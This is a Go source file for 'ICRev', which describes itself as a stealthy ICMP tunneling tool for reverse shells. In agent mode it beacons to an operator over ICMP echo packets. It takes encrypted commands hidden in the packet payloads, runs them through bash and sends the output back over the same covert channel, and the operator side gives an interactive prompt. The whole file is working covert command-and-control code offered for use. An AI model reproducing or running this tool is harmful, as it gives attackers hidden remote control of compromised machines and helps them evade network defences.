package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/The-Lxx-CLoUD/CLoUD-ICMP/crypto"
	"github.com/The-Lxx-CLoUD/CLoUD-ICMP/icmp"
)

const (
	toolName       = "ICRev"
	toolVersion    = "1.0 (x64)"
	releaseDate    = "October 08, 2025"
	authorEmail    = "darkbitx01@protonmail.com"
	authorTelegram = "https://t.me/DarkBitx"
	bannerFormat   = `
  ╱|╲   %s %s release (%s)
 ╱ | ╲
 |- -|  <<< DarkBit 'Lucyber' (%s)
 ╲ | ╱  %s (%%s)
  ╲|╱
`
	helpMessage = `
Usage: %s [options]

ICRev is a stealthy ICMP tunneling tool for secure reverse shell.

Required Options:
  -i, --interface string   Interface IP to listen on (e.g., 0.0.0.0)
  -t, --target string      Target address to stablish tunnel (e.g., 192.168.1.100)

Optional Options:
  -p, --secret string      Secret key for authentication (default: auto-generated)
  -s, --server             Enable server mode (default: agent mode)
  -v, --verbose            Enable verbose output

Example:
  icrev -i 0.0.0.0 -t 192.168.1.100 -s -v

`
)

var (
	intAddr    string
	trgAddr    string
	secretKey  string
	serverMode bool
	verbose    bool
)

type ServerState struct {
	mu               sync.Mutex
	icmpHdr          icmp.ICMPHeader
	pendingCmd       string
	awaitingResponse bool
}

var (
	once           sync.Once
	previousPacket []byte
)

func serverHandler() {
	secretKeyByte := []byte(secretKey)
	buf := make([]byte, icmp.MTULen)

	listener, err := icmp.NewICMPListener(intAddr, trgAddr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error while creating listener: %v\n", err)
		os.Exit(0)
	}
	defer listener.Close()

	scanner := bufio.NewScanner(os.Stdin)
	exitChan := make(chan bool)
	var wg sync.WaitGroup

	state := &ServerState{}
	alive := []byte("alive")
	recv := []byte("recv")

	wg.Add(2)
	go func() {
		defer wg.Done()
		for {
			select {
			case <-exitChan:
				return

			default:
				state.mu.Lock()
				for state.pendingCmd != "" || state.awaitingResponse {
					state.mu.Unlock()
					time.Sleep(100 * time.Millisecond)
					state.mu.Lock()
				}
				state.mu.Unlock()

				fmt.Print("[icrevbit]# ")
				if !scanner.Scan() {
					close(exitChan)
					return
				}

				cmd := scanner.Text()
				if cmd == "" {
					continue
				}

				if cmd == "exit" {
					close(exitChan)
				}

				state.mu.Lock()
				state.pendingCmd = cmd
				state.mu.Unlock()
			}
		}
	}()
	go func() {
		defer wg.Done()
		var responseChunks []byte
		for {
			select {
			case <-exitChan:
				return

			default:
				length, err := listener.Read(buf)
				if err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "Error while reading packet: %v\n", err)
					}
					continue
				}

				if length < icmp.MinICMPHeaderLen {
					if verbose {
						fmt.Printf("Invalid packet from %s: Length %d byte\n", trgAddr, length)
					}
					continue
				}

				icmpOffset := 0
				if length >= icmp.MinIPv4HeaderLen {
					if buf[9] == 1 {
						icmpOffset = int(buf[0]&0x0F) * 4
					}
				}

				hdr, payload, err := icmp.ParseICMP(buf, icmpOffset, length)
				if err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "Error while parsing packet %s: %v\n", trgAddr, err)
					}
					continue
				}

				state.mu.Lock()
				state.icmpHdr = hdr
				state.mu.Unlock()

				receivedSign := payload[:icmp.MaxSignatureLen]
				reqresType := payload[icmp.MaxSignatureLen : icmp.MaxSignatureLen+icmp.MaxReqRspLen]
				iv := payload[icmp.MaxSignatureLen+icmp.MaxReqRspLen : icmp.MaxSignatureLen+icmp.MaxReqRspLen+icmp.MaxIvLen]
				ciphertext := payload[icmp.MaxSignatureLen+icmp.MaxReqRspLen+icmp.MaxIvLen:]

				if crypto.CalcHmac(secretKeyByte, receivedSign, ciphertext) != nil {
					continue
				}

				key, err := crypto.DeriveKey(secretKeyByte)
				if err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "Error while creating key %s: %v\n", trgAddr, err)
					}
					continue
				}
				plaintext, err := crypto.DecryptData(key, iv, ciphertext)
				if err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "Error while decrypting data %s: %v\n", trgAddr, err)
					}
					continue
				}

				if verbose {
					icmp.PrintICMP(listener.TrgAddr, verbose, hdr, icmpOffset, payload, length)
				}

				state.mu.Lock()
				id := state.icmpHdr.ID
				seq := state.icmpHdr.Seq
				state.mu.Unlock()

				switch uint8(reqresType[0]) {
				case icmp.REQ:
					if bytes.Equal(alive, plaintext) {
						state.mu.Lock()
						if state.pendingCmd != "" {
							cmd := state.pendingCmd
							state.pendingCmd = ""
							state.awaitingResponse = true
							state.mu.Unlock()
							cmdByte := []byte(cmd)
							cmdLen := len(cmdByte)

							var chunks [][]byte
							for i := 0; i < cmdLen; i += icmp.MaxDataLen {
								end := i + icmp.MaxDataLen
								if end > cmdLen {
									end = cmdLen
								}
								chunks = append(chunks, cmdByte[i:end])
							}

							if len(chunks) > 0 && len(chunks[len(chunks)-1]) == icmp.MaxDataLen {
								chunks = append(chunks, []byte{})
							}

							for i, chunk := range chunks {
								packet := icmp.CreateEchoReply(id, seq+uint16(i), icmp.REQ, secretKeyByte, nil, chunk, true)
								_, err := listener.Write(packet, true)
								if err != nil {
									fmt.Fprintf(os.Stderr, "Error while sending chunk: %v\n", err)
								}
							}

							if bytes.Equal(cmdByte, []byte("exit")) {
								os.Exit(0)
							}
						} else {
							var sendAlive bool
							if state.awaitingResponse {
								sendAlive = true
							} else {
								sendAlive = true
							}
							state.mu.Unlock()
							if sendAlive {
								packet := icmp.CreateEchoReply(id, seq, icmp.REQ, secretKeyByte, iv, alive, false)
								_, err := listener.Write(packet, false)
								if err != nil {
									fmt.Fprintf(os.Stderr, "Error while sending alive: %v\n", err)
								}
							}
						}
					}
				case icmp.RSP:

					packet := icmp.CreateEchoReply(id, seq, icmp.REQ, secretKeyByte, iv, recv, false)
					_, err := listener.Write(packet, false)
					if err != nil {
						fmt.Fprintf(os.Stderr, "Error while sending recv: %v\n", err)
					}
					responseChunks = append(responseChunks, plaintext...)
					if len(plaintext) < icmp.MaxDataLen {

						fmt.Printf("%s\n", string(responseChunks))
						responseChunks = nil
						state.mu.Lock()
						state.awaitingResponse = false
						state.mu.Unlock()

					}
				}
			}
		}
	}()
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)
	<-sigChan
	close(exitChan)
}

func comparePacket(a, b []byte) bool {
	if bytes.Equal(a, b) {
		return true
	}
	return false
}

func agentHandler() {
	secretKeyByte := []byte(secretKey)
	buf := make([]byte, icmp.MTULen)
	id := uint16(rand.New(rand.NewSource(time.Now().UnixNano())).Intn(1 << 16))
	seq := uint16(0)
	interval := time.Duration(3) * time.Second

	listener, err := icmp.NewICMPListener(intAddr, trgAddr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error while creating listener: %v\n", err)
		os.Exit(0)
	}
	defer listener.Close()

	var wg sync.WaitGroup
	exitChan := make(chan bool)
	wg.Add(2)
	go func() {
		defer wg.Done()
		var commandChunks []byte
		for {
			select {
			case <-exitChan:
				return

			default:
				length, err := listener.Read(buf)
				if err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "Error while reading packet: %v\n", err)
					}
					continue
				}

				if length < icmp.MinICMPHeaderLen {
					if verbose {
						fmt.Printf("Invalid packet from %s: Length %d byte\n", trgAddr, length)
					}
					continue
				}

				icmpOffset := 0
				if length >= icmp.MinIPv4HeaderLen {
					if buf[9] == 1 {
						icmpOffset = int(buf[0]&0x0F) * 4
					}
				}

				icmpHdr, payload, err := icmp.ParseICMP(buf, icmpOffset, length)
				if err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "Error while parsing packet %s: %v\n", trgAddr, err)
					}
					continue
				}

				receivedSign := payload[:icmp.MaxSignatureLen]
				reqresType := payload[icmp.MaxSignatureLen : icmp.MaxSignatureLen+icmp.MaxReqRspLen]
				iv := payload[icmp.MaxSignatureLen+icmp.MaxReqRspLen : icmp.MaxSignatureLen+icmp.MaxReqRspLen+icmp.MaxIvLen]
				ciphertext := payload[icmp.MaxSignatureLen+icmp.MaxReqRspLen+icmp.MaxIvLen:]

				if crypto.CalcHmac(secretKeyByte, receivedSign, ciphertext) != nil {
					continue
				}

				if comparePacket(buf[icmp.MaxICMPHeaderLen:len(previousPacket)], previousPacket[icmp.MaxICMPHeaderLen:]) {
					once.Do(func() { fmt.Printf("Reverse shell established (ip=%s)\n", listener.RcvAddr) })
				}

				if verbose {
					icmp.PrintICMP(listener.TrgAddr, verbose, icmpHdr, icmpOffset, payload, length)
				}

				key, err := crypto.DeriveKey(secretKeyByte)
				if err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "Error while creating key %s: %v\n", trgAddr, err)
					}
					continue
				}

				plaintext, err := crypto.DecryptData(key, iv, ciphertext)
				if err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "Error while decrypting data %s: %v\n", trgAddr, err)
					}
					continue
				}

				switch uint8(reqresType[0]) {
				case icmp.REQ:

					var output []byte
					defaultOutput := []byte("Done")
					exitStatus := false
					commandChunks = append(commandChunks, plaintext...)

					if len(plaintext) < icmp.MaxDataLen {
						cmd := string(commandChunks)
						parts := strings.Fields(cmd)

						switch {
						case cmd == "alive":
							if verbose {
								fmt.Println("Keep-Alive; continue...")
							}

						case cmd == "recv":
							if verbose {
								fmt.Println("Result Received; continue...")
							}

						case cmd == "exit":
							if verbose {
								fmt.Println("Exit Received; exiting...")
							}
							exitStatus = true

						case len(parts) > 0 && parts[0] == "sleep" && len(parts) > 1:
							num, err := strconv.Atoi(parts[1])
							if err == nil {
								interval = time.Duration(num) * time.Second
							}

							if verbose {
								fmt.Printf("sleep for every %d secends; continue...", num)
							}

							output = defaultOutput

						default:
							output, err = exec.Command("bash", "-c", cmd).Output()
							if err != nil {
								output = []byte(err.Error())
							}
						}

						if exitStatus {
							close(exitChan)
							os.Exit(0)
						}

						outputLen := len(output)
						var outputChunks [][]byte

						for i := 0; i < outputLen; i += icmp.MaxDataLen {
							end := i + icmp.MaxDataLen
							if end > outputLen {
								end = outputLen
							}
							outputChunks = append(outputChunks, output[i:end])
						}

						if len(outputChunks) > 0 && len(outputChunks[len(outputChunks)-1]) == icmp.MaxDataLen {
							outputChunks = append(outputChunks, []byte{})
						}

						for _, chunk := range outputChunks {

							packet := icmp.CreateEcho(id, seq, icmp.RSP, secretKeyByte, nil, chunk, true)
							_, err = listener.Write(packet, true)
							if err != nil {
								if verbose {
									fmt.Fprintf(os.Stderr, "Error while sending RSP chunk: %v\n", err)
								}
							}
							seq++
						}
						commandChunks = nil

					}
				}
			}
		}
	}()
	go func() {
		alive := []byte("alive")
		defer wg.Done()
		for {
			select {
			case <-exitChan:
				return

			default:
				packet := icmp.CreateEcho(id, seq, icmp.REQ, secretKeyByte, nil, alive, true)
				previousPacket = packet

				_, err := listener.Write(packet, false)
				if err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "Error while sending REQ: %v\n", err)
					}
				}
				seq++

				time.Sleep(interval)
			}
		}
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)
	<-sigChan
	close(exitChan)
}

func secretKeyGen() string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+{}[];"
	rand.New(rand.NewSource(time.Now().UnixNano()))

	var parts []string
	for i := 0; i < 10; i++ {
		parts = append(parts, string(chars[rand.Intn(len(chars))]))
	}
	return strings.Join(parts, "")
}

func printBanner(keyID string) {
	banner := fmt.Sprintf(bannerFormat, toolName, toolVersion, releaseDate, authorEmail, authorTelegram)
	fmt.Printf(banner, keyID)
}
func printConfig(intAddr, trgAddr string, serverMode, verbose bool) {
	fmt.Println("---------------------------------------------------------")
	fmt.Printf("| %-20s | %-30s |\n", "Listening Interface", intAddr)
	if trgAddr != "" {
		fmt.Printf("| %-20s | %-30s |\n", "Target Filter", trgAddr)
	} else {
		fmt.Printf("| %-20s | %-30s |\n", "Target Filter", "None (all traffic)")
	}
	fmt.Printf("| %-20s | %-30v |\n", "Server Mode", serverMode)
	fmt.Printf("| %-20s | %-30v |\n", "Verbose Mode", verbose)
	fmt.Println("---------------------------------------------------------")
}

func printHelp() {
	fmt.Printf(helpMessage, os.Args[0])
	os.Exit(0)
}

func init() {
	flag.StringVar(&intAddr, "i", "", "Interface IP to listen on (required)")
	flag.StringVar(&intAddr, "interface", "", "Interface IP to listen on (required, alias for -i)")
	flag.StringVar(&trgAddr, "t", "", "Target address to stablish tunnel (required)")
	flag.StringVar(&trgAddr, "target", "", "Target address to stablish tunnel (required, alias for -t)")
	flag.StringVar(&secretKey, "p", "", "Secret key for authentication (default: auto-generated)")
	flag.StringVar(&secretKey, "secret", "", "Secret key for authentication (default: auto-generated, alias for -p)")
	flag.BoolVar(&serverMode, "s", false, "Enable server mode (default: agent mode)")
	flag.BoolVar(&serverMode, "server", false, "Enable server mode (default: agent mode, alias for -s)")
	flag.BoolVar(&verbose, "v", false, "Enable verbose output")
	flag.BoolVar(&verbose, "verbose", false, "Enable verbose output, alias for -v")
	flag.Parse()
}

func main() {

	if intAddr == "" || trgAddr == "" {
		printHelp()
	}

	if secretKey == "" {
		secretKey = secretKeyGen()

	}

	printBanner(secretKey)
	printConfig(intAddr, trgAddr, serverMode, verbose)

	if serverMode {
		serverHandler()
	} else {
		agentHandler()
	}
}
